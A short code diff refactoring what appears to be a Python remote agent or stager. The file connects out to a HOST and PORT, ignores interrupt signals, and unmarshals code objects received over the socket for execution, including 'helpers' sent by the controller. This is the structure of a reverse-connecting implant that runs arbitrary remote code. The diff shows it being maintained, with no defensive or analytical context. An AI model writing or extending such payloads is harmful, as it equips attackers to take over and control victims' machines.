@@ -73,8 +73,9 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
         try:
             obj = marshal.loads(payload_bytes)
 
-            if isinstance(obj, CodeType):
-                code = obj
+            match obj:
+                case CodeType():
+                    code = obj
         except Exception:
             pass
 
@@ -98,13 +99,16 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
 
 def main() -> None:
     try:
-        if hasattr(signal, "SIGINT") and hasattr(signal, "signal"):
-            signal.signal(signal.SIGINT, signal.SIG_IGN)
+        signal.signal(signal.SIGINT, signal.SIG_IGN)
     except (AttributeError, ValueError):
         pass
 
     existing_sock = globals().get("_sock")
-    sock = existing_sock if isinstance(existing_sock, socket.socket) else socket.create_connection((HOST, PORT))
+    match existing_sock:
+        case socket.socket():
+            sock = existing_sock
+        case _:
+            sock = socket.create_connection((HOST, PORT))
 
     with sock:
         SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
@@ -131,8 +135,9 @@ def main() -> None:
                 try:
                     obj = marshal.loads(helpers_bytes)
 
-                    if isinstance(obj, CodeType):
-                        helpers_code = obj
+                    match obj:
+                        case CodeType():
+                            helpers_code = obj
                 except Exception:
                     pass
 
